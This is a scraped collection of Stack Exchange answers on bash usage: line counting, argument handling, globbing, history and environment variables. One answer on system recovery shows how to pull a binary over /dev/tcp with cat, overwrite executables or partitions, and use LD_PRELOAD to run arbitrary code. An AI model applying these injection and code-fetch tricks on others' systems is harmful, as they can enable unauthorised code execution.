  <p>How many lines are in each file.</p>
</blockquote>

<p>Use <code>wc</code>, originally for word count, I believe, but it can do lines, words, characters, bytes, and the longest line length. The <code>-l</code> option tells it to count lines.</p>

<pre><code>wc -l &lt;filename&gt;
</code></pre>

<p>This will output the number of lines in :</p>

<pre><code>$ wc -l /dir/file.txt
32724 /dir/file.txt
</code></pre>

<p>You can also pipe data to <code>wc</code> as well:</p>

<pre><code>$ cat /dir/file.txt | wc -l
32724
$ curl google.com --silent | wc -l
63
</code></pre>

<blockquote>
  <p>How many lines are in directory.</p>
</blockquote>

<p>Try:</p>

<pre><code>find . -name '*.pl' | xargs wc -l
</code></pre>

<p>another one-liner:</p>

<pre><code>( find ./ -name '*.pl' -print0 | xargs -0 cat ) | wc -l
</code></pre>

<p>BTW, <code>wc</code> command counts new lines codes, not lines. When last line in the file does not end with new line code, this will not counted.</p>

<p>You may use grep -c ^ , full example:</p>

<pre><code>#this example prints line count for all found files
total=0
find /path -type f -name ""*.php"" | while read FILE; do
     #you see use grep instead wc ! for properly counting
     count=$(grep -c ^ &lt; ""$FILE"")
     echo ""$FILE has $count lines""
     let total=total+count #in bash, you can convert this for another shell
done
echo TOTAL LINES COUNTED:  $total
</code></pre>

<blockquote>
  <p>How many lines in total</p>
</blockquote>

<p>Not sure that I understood you request correctly. e.g. this will output results in the following format, showing the number of lines for each file:</p>

<pre><code># wc -l `find /path/to/directory/ -type f`
 103 /dir/a.php
 378 /dir/b/c.xml
 132 /dir/d/e.xml
 613 total
</code></pre>

<p>Alternatively, to output just the total number of new line characters without the file by file counts to following command can prove useful:</p>

<pre><code># find /path/to/directory/ -type f -exec wc -l {} \; | awk '{total += $1} END{print total}'
 613
</code></pre>

<blockquote>
  <p>Most importantly, I need this in 'human readable format' eg.
  12,345,678 rather than 12345678</p>
</blockquote>

<p>Bash has a <a href=""http://wiki.bash-hackers.org/commands/builtin/printf"">printf</a> function built in:</p>

<pre><code>printf ""%0.2f\n"" $T
</code></pre>

<p>As always, there are many different methods that could be used to achieve the same results mentioned here.</p>
"
"Prompt for sudo password and programmatically elevate privilege in bash script?","28791","<bash><sudo>","56","<p>I run <code>sudo</code> directly from the script:</p>

<pre><code>if [ $EUID != 0 ]; then
    sudo ""$0"" ""$@""
    exit $?
fi
</code></pre>
"
"Variable substitution with an exclamation mark in bash","41292","<bash><variable-substitution>","56","<p>That is an <em>indirect expansion</em>, documented in <code>man bash</code> section <em>EXPANSION</em>, subsection <em>Parameter Expansion</em>:</p>

<blockquote>
  <p>If the first character of parameter is an exclamation point (!), a
  level of variable indirection is introduced.  Bash uses the value of
  the variable formed from the rest of parameter as the name of the
  variable; this variable is then expanded and that value is used in the
  rest of the substitution, rather than the value of parameter itself. 
  This is known as indirect expansion.</p>
</blockquote>

<pre><code>bash-4.2$ DDF_SOURCE=""siebel_DATA_DATE_FORMAT""

bash-4.2$ siebel_DATA_DATE_FORMAT='Hello Indirect Redirection'

bash-4.2$ DATA_DATE_FORMAT=${!DDF_SOURCE} # siebel_DATA_DATE_FORMAT must get value before this line

bash-4.2$ echo $DATA_DATE_FORMAT
Hello Indirect Redirection
</code></pre>
"
"$@ except the 1st argument","225943","<bash><shell><scripting>","56","<p>First, note that <code>$@</code> without quotes makes no sense and should not be used. <code>$@</code> should only be used quoted (<code>""$@""</code>) and in list contexts.</p>

<p><code>for i in ""$@""</code> qualifies as a list context, but here, to loop over the positional parameters, the canonical, most portable and simpler form is:</p>

<pre><code>for i
do something with ""$i""
done
</code></pre>

<p>Now, to loop over the elements starting from the second one, the canonical and most portable way is to use <code>shift</code>:</p>

<pre><code>first_arg=$1
shift # short for shift 1
for i
do something with ""$i""
done
</code></pre>

<p>After <code>shift</code>, what used to be <code>$1</code> has been removed from the list (but we've saved it in <code>$first_arg</code>) and what used to be in <code>$2</code> is now in <code>$1</code>. The positional parameters have been <em>shifted</em> <code>1</code> position to the left (use <code>shift 2</code> to shift by 2...). So basically, our loop is looping from what used to be the second argument to the last.</p>

<p>With <code>bash</code> (and <code>zsh</code> and <code>ksh93</code>, but that's it), an alternative is to do:</p>

<pre><code>for i in ""${@:2}""
do something with ""$i""
done
</code></pre>

<p>But note that it's not standard <code>sh</code> syntax so should not be used in a script that starts with <code>#! /bin/sh -</code>.</p>

<p>In <code>zsh</code> or <code>yash</code>, you can also do:</p>

<pre><code>for i in ""${@[3,-3]}""
do something with ""$i""
done
</code></pre>

<p>to loop from the 3rd to the 3rd last argument.</p>

<p>In <code>zsh</code>, <code>$@</code> is also known as the <code>$argv</code> array. So to pop elements from the beginning or end of the arrays, you can also do:</p>

<pre><code>argv[1,3]=() # remove the first 3 elements
argv[-3,-1]=()
</code></pre>

<p>(<code>shift</code> can also be written <code>1=()</code> in <code>zsh</code>)</p>

<p>In <code>bash</code>, you can only assign to the <code>$@</code> elements with the <code>set</code> builtin, so to pop 3 elements off the end, that would be something like:</p>

<pre><code>set -- ""${@:1:$#-3}""
</code></pre>

<p>And to loop from the 3rd to the 3rd last:</p>

<pre><code>for i in ""${@:3:$#-5}""
do something with ""$i""
done
</code></pre>

<p>POSIXly, to pop the last 3 elements of <code>""$@""</code>, you'd need to use a loop:</p>

<pre><code>n=$(($# - 3))
for arg do
  [ ""$n"" -gt 0 ] &amp;&amp; set -- ""$@"" ""$arg""
  shift
  n=$((n - 1))
done
</code></pre>
"
"How can I `alias sudo !!`?","85352","<bash><sudo><alias><command-history><history-expansion>","56","<p><code>!!</code> is expanded by bash when you type it. It's not expanded by alias substitution.</p>

<p>You can use the <code>history</code> built-in to do the expansion:</p>

<pre><code>alias sbb='sudo $(history -p !!)'
</code></pre>

<p>If the command is more than a simple command (e.g. it contains redirections or pipes), you need to invoke a shell under sudo:</p>

<pre><code>alias sbb='sudo ""$BASH"" -c ""$(history -p !!)""'
</code></pre>
"
"Does the Bash star * wildcard always produce an (ascending) sorted list?","368318","<bash><shell><wildcards>","56","<p>In all shells, globs are sorted by default. <a href=""https://github.com/dspinellis/unix-history-repo/blob/a72ea270ad342b4f89bed4becd053a6a673b4877/cmd/glob.c"" rel=""noreferrer"">They were already by the <code>/etc/glob</code> helper</a> called by Ken Thompson's shell to expand globs in the first version of Unix in the early 70s (and which gave globs their name).</p>

<p>For <code>sh</code>, POSIX does require them to be sorted by way of <code>strcoll()</code>, that is using the sorting order in the user's locale, like for <code>ls</code> though some still do it via <code>strcmp()</code>, that is based on byte values only.</p>

<pre><code>$ dash -c 'echo *'
Log01B log-0D log00 log01 log02 log0A log0B log0C log4E log4F log50 log① log② lóg01
$ bash -c 'echo *'
log① log② log00 log01 lóg01 Log01B log02 log0A log0B log0C log-0D log4E log4F log50
$ zsh -c 'echo *'
log① log② log00 log01 lóg01 Log01B log02 log0A log0B log0C log-0D log4E log4F log50
$ ls
log②  log①  log00  log01  lóg01  Log01B  log02  log0A  log0B  log0C  log-0D  log4E  log4F  log50
$ ls | sort
log②
log①
log00
log01
lóg01
Log01B
log02
log0A
log0B
log0C
log-0D
log4E
log4F
log50
</code></pre>

<p>You may notice above that for those shells that do sorting based on locale, here on a GNU system with a <code>en_GB.UTF-8</code> locale, the <code>-</code> in the file names is ignored for sorting (most punctuation characters would). The <code>ó</code> is sorted in a more expected way (at least to British people), and case is ignored (except when it comes to decide ties).</p>

<p>However, you'll notice some inconsistencies for log① log②. That's because the sorting order of ① and ② is not defined in GNU locales (currently; hopefully it will be fixed some day). They sort the same, so you get random results.</p>

<p>Changing the locale will affect the sorting order. You can set the locale to C to get a <code>strcmp()</code>-like sort:</p>

<pre><code>$ bash -c 'echo *'
log① log② log00 log01 lóg01 Log01B log02 log0.2 log0A log0B log0C log-0D log4E log4F log50
$ bash -c 'LC_ALL=C; echo *'
Log01B log-0D log0.2 log00 log01 log02 log0A log0B log0C log4E log4F log50 log① log② lóg01
</code></pre>

<p>Note that some locales can cause some confusions even for all-ASCII all-alnum strings. Like Czech ones (on GNU systems at least) where <code>ch</code> is a <em>collating element</em> that sorts after <code>h</code>:</p>

<pre><code>$ LC_ALL=cs_CZ.UTF-8 bash -c 'echo *'
log0Ah log0Bh log0Dh log0Ch
</code></pre>

<p>Or, as pointed out by @ninjalj, even weirder ones in Hungarian locales:</p>

<pre><code>$ LC_ALL=hu_HU.UTF-8 bash -c 'echo *'
logX LOGx LOGX logZ LOGz LOGZ logY LOGY LOGy
</code></pre>

<p>In <code>zsh</code>, you can choose the sorting with <a href=""http://zsh.sourceforge.net/Doc/Release/Expansion.html#Glob-Qualifiers"" rel=""noreferrer"">glob qualifiers</a>. For instance:</p>

<pre><code>echo *(om) # to sort by modification time
echo *(oL) # to sort by size
echo *(On) # for a *reverse* sort by name
echo *(o+myfunction) # sort using a user-defined function
echo *(N)  # to NOT sort
echo *(n)  # sort by name, but numerically, and so on.
</code></pre>

<p>The numeric sort of <code>echo *(n)</code> can also be enabled globally with the <code>numericglobsort</code> option:</p>

<pre><code>$ zsh -c 'echo *'
log① log② log00 log01 lóg01 Log01B log02 log0.2 log0A log0B log0C log-0D log4E log4F log50
$ zsh -o numericglobsort -c 'echo *'
log① log② log00 lóg01 Log01B log0.2 log0A log0B log0C log01 log02 log-0D log4E log4F log50
</code></pre>

<p>If you (as I was) are confused by that order in that particular instance (here using my British locale), see <a href=""http://www.zsh.org/mla/workers/2017/msg00851.html"" rel=""noreferrer"">here</a> for details.</p>
"
"How do I exit a script in a conditional statement?","23961","<bash><shell><shell-script><scripting>","55","<p>You could do that this way:</p>

<pre><code>[[ $(id -u) -eq 0 ]] || { echo &gt;&amp;2 ""Must be root to run script""; exit 1; }
</code></pre>

<p>(""ordinary"" conditional expression with an arithmetic binary operator in the first statement), or:</p>

<pre><code>(( $(id -u) == 0 )) || { echo &gt;&amp;2 ""Must be root to run script""; exit 1; }
</code></pre>

<p>(arithmetic evaluation for the first test).</p>

<p>Notice the change <code>()</code> -> <code>{}</code> - the curly brackets do <strong>not</strong> spawn a subshell. (Search <code>man bash</code> for ""subshell"".)</p>
"
"When do you use brace expansion?","6035","<bash><shell><zsh><ksh><brace-expansion>","55","<p>Brace expansion is very useful if you have long path names. I use it as a quick way to <strong>backup a file</strong>:</p>

<pre><code>cp /a/really/long/path/to/some/file.txt{,.bak}
</code></pre>

<p>will copy <code>/a/really/long/path/to/some/file.txt</code> to <code>/a/really/long/path/to/some/file.txt.bak</code></p>

<p>You can also use it in a <strong>sequence</strong>. I once did so to download lots of pages from the web:</p>

<pre><code>wget http://domain.com/book/page{1..5}.html
</code></pre>

<p>or</p>

<pre><code>for i in {1..100}
do
   #do something 100 times
done
</code></pre>
"
"Closing a file descriptor, >&- vs <&-","131801","<bash><shell><io-redirection>","55","<p>You can close file descriptor using both <code>&lt;&amp;-</code> and <code>&gt;&amp;-</code>, <code>bash</code> will parse two syntax as the same.</p>

<p>From file <a href=""http://git.savannah.gnu.org/cgit/bash.git/tree/y.tab.c"">y.tab.c</a> in <code>bash</code> source code:</p>

<pre><code>5385   /* Hack &lt;&amp;- (close stdin) case.  Also &lt;&amp;N- (dup and close). */                
5386   if MBTEST(character == '-' &amp;&amp; (last_read_token == LESS_AND || last_read_token == GREATER_AND))
5387     return (character);
</code></pre>
"
"Using export in .bashrc","107851","<bash><environment-variables><bashrc>","55","<p>You only need <code>export</code> for variables that should be ""seen"" by other programs which you launch in the shell, while the ones that are only used inside the shell itself don't need to be <code>export</code>ed.</p>

<p>This is what the man page says:</p>

<pre class=""lang-none prettyprint-override""><code>The  supplied  names are marked for automatic export to the environ‐
ment of subsequently executed commands.  If the -f option is  given,
the  names  refer to functions.  If no names are given, or if the -p
option is supplied, a list of all names that are  exported  in  this
shell  is  printed.   The -n option causes the export property to be
removed from each name.  If a variable name is  followed  by  =word,
the  value  of  the variable is set to word.  export returns an exit
status of 0 unless an invalid option  is  encountered,  one  of  the
names  is  not a valid shell variable name, or -f is supplied with a
name that is not a function.
</code></pre>

<p>This can be demonstrated with the following:</p>

<pre><code>$ MYVAR=""value""
$ echo ${MYVAR}
value
$ echo 'echo ${MYVAR}' &gt; echo.sh
$ chmod +x echo.sh
$ ./echo.sh

$ export MYVAR=""value-exported""
$ ./echo.sh
value-exported
</code></pre>

<p>Explanation:</p>

<ul>
<li>I first set <code>${MYVAR}</code> to be a Shell variable with <code>MYVAR=""value""</code>. Using <code>echo</code> I can echo the value of it because echo is part of the shell.</li>
<li>Then I create <code>echo.sh</code>. That's a little script that basically does the same, it just echoes <code>${MYVAR}</code>, but the difference is that it will run in a different process because it's a separate script.</li>
<li>When calling <code>echo.sh</code> it outputs nothing, because the new process does not inherit <code>${MYVAR}</code></li>
<li>Then I export <code>${MYVAR}</code> into my environment with the <code>export</code> keyword</li>
<li>When I now run the same <code>echo.sh</code> again, it echoes the content of <code>${MYVAR}</code> because it gets it from the environment</li>
</ul>

<p>So to answer your question:</p>

<p>It depends where a variable is going to be used, whether you have to export it or not.</p>
"
"less command and syntax highlighting","90990","<bash><vim><vi><less><syntax-highlighting>","55","<p>Syntax highlighting of <code>less</code>, works just fine on most *nix systems. </p>

<pre><code>apt install source-highlight
export LESSOPEN=""| /usr/share/source-highlight/src-hilite-lesspipe.sh %s""
export LESS=' -R '
</code></pre>

<p>On Fedora/RedHat based distros use <code>/usr/bin/src-hilite-lesspipe.sh</code> instead.</p>

<p>Even on Cygwin you can do it with the minor adjustment of the shell script path and installing with <a href=""https://github.com/kou1okada/apt-cyg"" rel=""noreferrer""><code>apt-cyg</code></a> instead of <code>apt</code>.</p>

<p>However, using this drastically slows down browsing of large files. I suggest to use <code>alias</code> in such a way to only implement the <code>LESSOPEN</code> export above when needed, like this:</p>

<pre><code>alias lessh='LESSOPEN=""| /usr/bin/src-hilite-lesspipe.sh %s"" less -M '
</code></pre>

<p>where the <code>-M</code> flag is convenient to also show filename and line number.</p>

<p>Also remember to copy the script into your bin path: </p>

<pre><code>cp /usr/share/source-highlight/src-hilite-lesspipe.sh /usr/bin/src-hilite-lesspipe.sh
</code></pre>

<hr>

<p><strong>UPDATE: 2019-07-24</strong></p>

<p>Apparently, on more recent Cygwin installs, you have the following files in your path: </p>

<pre><code>source-highlight.exe
source-highlight-esc.sh
source-highlight-settings.exe
</code></pre>

<p>So now you also need to execute the <code>source-highlight-settings.exe</code> that will add the configuration file:<br>
<code>$HOME/.source-highlight/source-highlight.conf</code>. </p>
"
"How to create a sequence with leading zeroes using brace expansion","60257","<bash><arithmetic><brace-expansion>","54","<p>Prefix the first number with a <code>0</code> to force each term to have the same  width.</p>

<pre><code>$ echo {08..10}
08 09 10
</code></pre>

<p>From the bash man page section on Brace Expansion:</p>

<blockquote>
  <p>Supplied integers may be prefixed with 0 to force each term to have
  the same  width.  When  either  x or y begins with a zero, the shell
  attempts to force all generated terms to contain the same number of
  digits, zero-padding where necessary.</p>
</blockquote>

<p>Also note that you can use <code>seq</code> with the <code>-w</code> option to equalize width by padding with leading zeroes:</p>

<pre><code>$ seq -w 8 10
08
09
10

$ seq -s "" "" -w 8 10
08 09 10
</code></pre>

<p>If you want more control, you can even specify a printf style format:</p>

<pre><code>$ seq -s "" "" -f %02g 8 10
08 09 10
</code></pre>
"
"CLICOLOR and LS_COLORS in bash","2897","<bash><settings><colors><display-settings>","54","<p>There are several different implementations of color for ls, and you've conflated some of them.</p>

<ul>
<li><p>On <a href=""http://www.freebsd.org/cgi/man.cgi?query=ls&amp;apropos=0&amp;sektion=1&amp;format=html"">FreeBSD</a> and <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man1/ls.1.html"">Mac OS X</a>, <code>ls</code> shows colors if the <code>CLICOLOR</code> environment variable is set or if <code>-G</code> is passed on the command line. The actual colors are configured through the <code>LSCOLORS</code> environment variable (built-in defaults are used if this variable is not set). To show directories in light blue, use</p>

<pre><code>export LSCOLORS=Exfxcxdxbxegedabagacad
</code></pre></li>
<li><p>With <a href=""http://www.gnu.org/software/coreutils/manual/html_node/General-output-formatting.html"">GNU ls</a>, e.g. on Linux, <code>ls</code> shows colors if <code>--color</code> is passed on the command line. The actual colors are configured through the <code>LS_COLORS</code> environment variable, which can be set with the <a href=""http://www.gnu.org/software/coreutils/manual/html_node/dircolors-invocation.html""><code>dircolors</code></a> command (built-in defaults are used if this variable is not set).</p></li>
</ul>
"
"Is there any reason to have a shebang pointing at /bin/sh rather than /bin/bash?","250913","<bash><shell><history><shebang>","54","<ol>
<li>There are systems not shipping bash by default (e.g. FreeBSD).</li>
<li>Even if bash is installed, it might not be located in <code>/bin</code>.</li>
<li>Most simple scripts don't require bash.</li>
<li>Using the POSIX shell is more portable and the scripts will run on a greater variety of systems.</li>
</ol>
"
"How to export variables that are set, all at once?","79068","<bash>","54","<p>Run the following command, before setting the variables:</p>

<pre><code>set -a 
</code></pre>

<p>man page : </p>

<blockquote>
  <p><code>-a</code><br>
      When this option is on, the export attribute shall be set for each variable to which an assignment is performed;</p>
</blockquote>

<p>To turn this option off, run <code>set +a</code> afterwards. </p>

<p>Example:</p>

<pre><code>set -a
. ./environment
set +a
</code></pre>

<p>Where <code>environment</code> contains:</p>

<pre><code>FOO=BAR
BAS='quote when using spaces'
</code></pre>
"
"In Bash scripting, what's the meaning of "" $! ""?","85021","<bash><shell><variable>","54","<p><code>$!</code> contains the process ID of the most recently executed background pipeline. From <code>man bash</code>:</p>
<blockquote>
<h3>Special Parameters</h3>
<p>The shell treats several parameters specially.  These parameters may only be referenced; assignment to them is not allowed.</p>
<p>...</p>
<p><code>!</code> - Expands to the process ID of the  most  recently  executed  background (asynchronous) command.</p>
</blockquote>
<p>For example:</p>
<pre><code>$ sleep 60 &amp;
[1] 6238
$ echo &quot;$!&quot;
6238
</code></pre>
"
"Change permisions of a file with my cat's help","475353","<bash><filesystems><cat><root-filesystem><system-recovery>","53","<p>There are several possibilities, all depending on the exact parameters of your situation right now. I'm going to assume Linux in the following examples where applicable, but similar functionality exists on other platforms in most cases.</p>

<ul>
<li><p>You might be able to get the dynamic loader to run an executable for you. Assuming <code>cat</code> is dynamically-linked, your platform's equivalent of <code>/lib/ld-linux.so.2</code> will likely also be in memory and thus usable to run a binary:</p>

<pre><code>$ /lib64/ld-linux-x86-64.so.2 ./chmod
chmod: missing operand
</code></pre>

<p>You may have multiple of these (32- and 64-bit are likely) and there may be multiple copies available, or symlinks that need resolving. One of those may work.</p></li>
<li><p>If you have a mounted vfat or NTFS filesystem, or another that treats all files as 777, you can create your executable on there.</p>

<pre><code>$ cat &gt; /mnt/windows/chmod &lt; /dev/tcp/localhost/9999
</code></pre></li>
<li>If you have a mounted network filesystem, even if it's not locally writable, you can create files on the remote system and use those normally.</li>
<li><p>If there's a mounted partition you don't care about the contents of, on a drive that is still mostly working, you can replace the contents with a new image of the same filesystem type containing executables you want - <code>cat</code> should be fine for this in the role people usually use <code>dd</code> for, and you can provide the image over the network.</p>

<pre><code>$ cat &gt; /dev/sdb1 &lt; ...
</code></pre>

<p>This one is plausible, but has a lot of places not to work depending on what exactly is still in memory from that partition.</p></li>
<li><p>If there is <em>any</em> accessible file that has execute permission on any writable filesystem, you can <code>cat &gt;</code> into it to replace the contents with a binary of your choosing.</p>

<pre><code>$ cat &gt; ~/test.py &lt; ...
</code></pre></li>
<li>Since Bash is still running, you could dynamically load a Bash plugin into the process that exposes chmod. In particular, you could <a href=""https://github.com/taviso/ctypes.sh"" rel=""noreferrer"">install and load <code>ctypes.sh</code></a>, which provides a foreign function interface to Bash, and then <code>dlcall chmod ./netcat 511</code>.</li>
<li><p>You could bring in a dynamic library file <code>foo.so</code> of your construction and then have <code>cat</code> load it on your behalf by way of <code>LD_PRELOAD</code>, allowing you to execute arbitrary code.</p>

<pre><code>$ LD_PRELOAD=./hack.so cat /dev/null
</code></pre>

<p>If you intercept, for example, <code>open</code>:</p>

   <pre class=""lang-c prettyprint-override""><code>int open(const char *path, int flags, ...) {
    chmod(path, 0755);
    return -1;
}
</code></pre>

<p>then you can do whatever you need to do in there.</p></li>
</ul>

<p>My suggestion would be to bring in a statically-linked <code>busybox</code> executable as the first item (or really, only item) so that you've got the full range of commands available without reusing whatever hack got you to that point to exhaustion.</p>
"
"Bash: double equals vs -eq","16109","<bash><shell><arithmetic>","53","<p><code>==</code> is a <code>bash</code>-specific alias for <code>=</code>, which performs a string (lexical) comparison instead of the <code>-eq</code> numeric comparison.  (It's backwards from Perl:  the word-style operators are numeric, the symbolic ones lexical.)</p>
"
"How do I open an incognito bash session?","158933","<bash><shell><command-history><privacy>","53","<p>When you want <code>bash</code> to stop logging your commands, just unset the <code>HISTFILE</code> variable:</p>

<pre><code>HISTFILE=
</code></pre>

<p>All further commands should then no longer be logged to <code>.bash_history</code>.</p>

<p>On the other hand, if you are actually supplying passwords as arguments to commands, you're already doing something wrong. <code>.bash_history</code> is not world-readable and therefore not the biggest threat in this situation:</p>

<p><code>ps</code> and <code>/proc</code> are the big problem. All users on the system can see the commands you're currently running <em>with all of their arguments</em>. Passing passwords as command line arguments is therefore <strong>inherently insecure</strong>. Use environment variables or config files (that you have chmodded 600) to securely supply passwords.</p>
"
"find files without extension","144208","<bash><shell><find><wildcards>","52","<p>you could use: <code>find . -type f ! -name ""*.*""</code>
the <code>!</code> negates the following expression, here a filename that contains a '.'</p>

<p>you can also use the <code>-maxdepth</code> option to reduce the search depth.</p>
"
"Find files in multiple folder names","60849","<bash><find><regular-expression>","52","<p>And if you want to search three folders named <code>foo</code>, <code>bar</code>, and <code>baz</code> for all <code>*.py</code> files, use this command:</p>

<p><code>find foo bar baz -name ""*.py""</code></p>

<p>so if you want to display files from <code>dir1</code> <code>dir2</code> <code>dir3</code> use <code>find dir1 dir2 dir3 -type f</code></p>

<p>try this <code>find . \( -name ""dir1"" -o -name ""dir2"" \) -exec ls '{}' \;</code></p>
"
"Launch a background process and check when it ends","76717","<bash>","52","<p>The key is the ""wait"" command:</p>

<pre><code>#!/bin/bash

/my/process &amp;
/another/process &amp;
wait
echo ""All processes done!""
</code></pre>
"
"Transform an array into arguments of a command?","29509","<bash><parameter><array>","52","<p>I would prefer a plain <code>bash</code> way:</p>

<pre><code>command ""${my_array[@]/#/-}"" ""$1""
</code></pre>

<p>One reason for this are the spaces. For example if you have:</p>

<pre><code>my_array=(option1 'option2 with space' option3)
</code></pre>

<p>The <code>sed</code> based solutions will transform it in <code>-option1 -option2 -with -space -option3</code> (length 5), but the above <code>bash</code> expansion will transform it into <code>-option1 -option2 with space -option3</code> (length still 3). Rarely, but sometimes this is important, for example:</p>

<pre><code>bash-4.2$ my_array=('Ffoo bar' 'vOFS=fiz baz')
bash-4.2$ echo 'one foo bar two foo bar three foo bar four' | awk ""${my_array[@]/#/-}"" '{print$2,$3}'
 two fiz baz three
</code></pre>
"
"How to execute consecutive commands from history?","24739","<bash><command-line><command-history>","52","<p>If it refers to commands run just recently, a more efficient way is to reference them with negative numbers:</p>

<pre><code>!-4; !-3; !-2; !-1
</code></pre>

<p>Also, once you do it, your last history entry will contain the whole chain of commands, so you can repeat it with <code>!!</code>.</p>

<hr>

<p><strong>Edit:</strong>
If you haven't already, get familiar with the great builtin function <strong><code>fc</code>, <a href=""https://unix.stackexchange.com/a/24763/9382"">mentioned by Gilles</a></strong>. (Use <code>help fc</code>.) It turns out that you can also use negative numbers with it, so you could do the same as above using</p>

<pre><code>eval ""`fc -ln -4 -1`""
</code></pre>

<p>This has one caveat, though: after this, the <code>eval</code> line is stored in the history as the last command. So if you run this again, you'll fall into a loop!</p>

<p>A safer way of doing this is to use the default <code>fc</code> operation mode: forwarding the selected range of commands to an editor and running them once you exit from it. Try:</p>

<pre><code> fc -4 -1
</code></pre>

<p>You can even reverse the order of the range of commands: <code>fc -1 -4</code></p>
"
"How are parentheses interpreted at the command line?","26063","<bash><shell><quoting>","51","<p>Parentheses denote a subshell in bash.  To quote the <code>man bash</code> page:</p>

<pre><code>(list)    list  is  executed  in  a  subshell  environment (see COMMAND
          EXECUTION ENVIRONMENT below).  Variable assignments and builtin 
          commands that affect the shell's environment do not remain in 
          effect after the command completes.  The return status is the
          exit status of list.
</code></pre>

<p>where a <code>list</code> is just a normal sequence of commands.</p>

<p>This is actually quite portable and not specific to just <code>bash</code> though.  The <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_09_04"" rel=""noreferrer"">POSIX Shell Command Language spec</a> has the following description for the <code>(compound-list)</code> syntax:</p>

<blockquote>
  <p>Execute <em>compound-list</em> in a subshell environment; see <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_12"" rel=""noreferrer"">Shell Execution Environment</a>. Variable assignments and built-in commands that affect the environment shall not remain in effect after the list finishes.</p>
</blockquote>
"
"Prevent grep from exiting in case of nomatch","330660","<bash><grep><exit><error-handling>","51","<pre><code>echo &quot;anything&quot; | { grep e || true; }
</code></pre>
<p>Explanation:</p>
<pre><code>$ echo &quot;anything&quot; | grep e
### error
$ echo $?
1
$ echo &quot;anything&quot; | { grep e || true; }
### no error
$ echo $?
0
### DopeGhoti's &quot;no-op&quot; version
### (Potentially avoids spawning a process, if `true` is not a builtin):
$ echo &quot;anything&quot; | { grep e || :; }
### no error
$ echo $?
0
</code></pre>
<p>The &quot;||&quot; means &quot;or&quot;. If the first part of the command &quot;fails&quot; (meaning &quot;grep e&quot; returns a non-zero exit code) then the part after the &quot;||&quot; is executed, succeeds and returns zero as the exit code  (<code>true</code> always returns zero).</p>
"
"Disable CTRL-D from closing my window with the terminator terminal emulator)","139115","<bash><shell><command-line><terminal>","51","<p>You can also disable eof generally in bash:</p>

<p><code>set -o ignoreeof</code></p>
"
"Is it possible to have vim key bindings in terminal?","4870","<bash><shell><terminal><vim><zsh>","51","<p>It has insert and normal mode (the insert mode is default, and escape for normal mode) but no visual mode.</p>

<p>In bash: <code>set -o vi</code> You can run it at the command line for just this session or add it to your .bashrc file.</p>

<p>Many programs use <code>readline</code> for input, and you can make any of them use vi-style keybindings by setting up your <code>.inputrc</code> with</p>

<pre><code>set editing-mode vi
set keymap vi
</code></pre>

<p>In zsh, if you change your <code>EDITOR</code> environment variable, the shell will match it.</p>
"
"giving grep output to rm","9597","<bash><grep><rm>","51","<p>You need to use <code>xargs</code> to turn standard input into arguments for <code>rm</code>.</p>

<pre><code>$ ls | grep '^Dar' | xargs rm
</code></pre>

<p>(Beware of special characters in filenames; with GNU grep, you might prefer</p>

<pre><code>$ ls | grep -Z '^Dar' | xargs -0 rm
</code></pre>

<p>)</p>

<p>Also, while the shell doesn't use regexps, that's a simple pattern:</p>

<pre><code>$ rm Dar*
</code></pre>

<p>(meanwhile, I think I need more sleep.)</p>
"
"Difference between printf and echo in bash","58310","<bash>","50","<p>The difference is that <code>echo</code> sends a newline at the end of its output. There is no way to ""send"" an EOF.</p>
"
"Delete last N lines from bash history","65075","<bash><command-history>","50","<p>As of <code>bash-5.0-alpha</code>, the <code>history</code> command now takes a range for the delete (<code>-d</code>) option. See <a href=""https://unix.stackexchange.com/questions/65075/delete-last-n-lines-from-bash-history/573267#573267"">rastafile's answer</a>.</p>

<p>For older versions, workaround below.</p>

<hr>

<p>You can use <a href=""http://www.gnu.org/software/bash/manual/html_node/Bash-History-Builtins.html"" rel=""nofollow noreferrer""><code>history -d offset</code></a> builtin to delete a specific line from the current shell's history, or <code>history -c</code> to clear the whole history.</p>

<p>It's not really practical if you want to remove a range of lines, since it only takes one offset as an argument, but you could wrap it in a function with a loop.</p>

<pre><code>rmhist() {
    start=$1
    end=$2
    count=$(( end - start ))
    while [ $count -ge 0 ] ; do
        history -d $start
        ((count--))
    done
}
</code></pre>

<p>Call it with <code>rmhist first_line_to_delete last_line_to_delete</code>. (Line numbers according to the output of <code>history</code>.)</p>

<p>(Use <code>history -w</code> to force a write to the history file.)</p>
"
"$_ vs !$. Last argument of the preceding command and output redirection","271659","<bash><shell><history-expansion>","50","<p><code>!$</code> is a word designator of history expansion, it expands to the last word of previous command in <em>history</em>. IOW, the last word of previous entry in history. This word is usually the last argument to command, but not in case of redirection. In:</p>

<pre><code>echo ""hello"" &gt; /tmp/a.txt
</code></pre>

<p>the whole command <code>'echo ""hello"" &gt; /tmp/a.txt'</code> appeared in history, and <code>/tmp/a.txt</code> is the last word of that command.</p>

<p><code>_</code> is a shell parameter, it expands to last argument of previous command. Here, the redirection is not a part of arguments passed to the command, so only <code>hello</code> is the argument passed to <code>echo</code>. That's why <code>$_</code> expanded to <code>hello</code>.</p>

<p><code>_</code> is not one of <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_05_02"" rel=""noreferrer"">shell standard special parameters</a> anymore. It works in <code>bash</code>, <code>zsh</code>, <code>mksh</code> and <code>dash</code> only when interactive, <code>ksh93</code> only when two command are on separated lines:</p>

<pre><code>$ echo 1 &amp;&amp; echo $_
1
/usr/bin/ksh

$ echo 1
1
$ echo $_
1
</code></pre>
"
"why does ls -d also list files, and where is it documented?","75046","<bash><shell><ls><wildcards><options>","50","<p>The <code>a*</code> and <code>*a*</code> syntax is implemented by the shell, not by the <code>ls</code> command.</p>

<p>When you type</p>

<pre><code>ls a*
</code></pre>

<p>at your shell prompt, the shell expands <code>a*</code> to a list of existing all files in the current directory whose names start with <code>a</code>. For example, it might expand <code>a*</code> to the sequence <code>a1 a2 a3</code>, and pass those as arguments to <code>ls</code>. The <code>ls</code> command itself never sees the <code>*</code> character; it only sees the three arguments <code>a1</code>, <code>a2</code>, and <code>a3</code>.</p>

<p>For purposes of wildcard expansion, ""files"" refers to all entities in the current directory. For example, <code>a1</code> might be a normal file, <code>a2</code> might be a directory, and <code>a3</code> might be a symlink. They all have directory entries, and the shell's wildcard expansion doesn't care what kind of entity those entries refer to.</p>

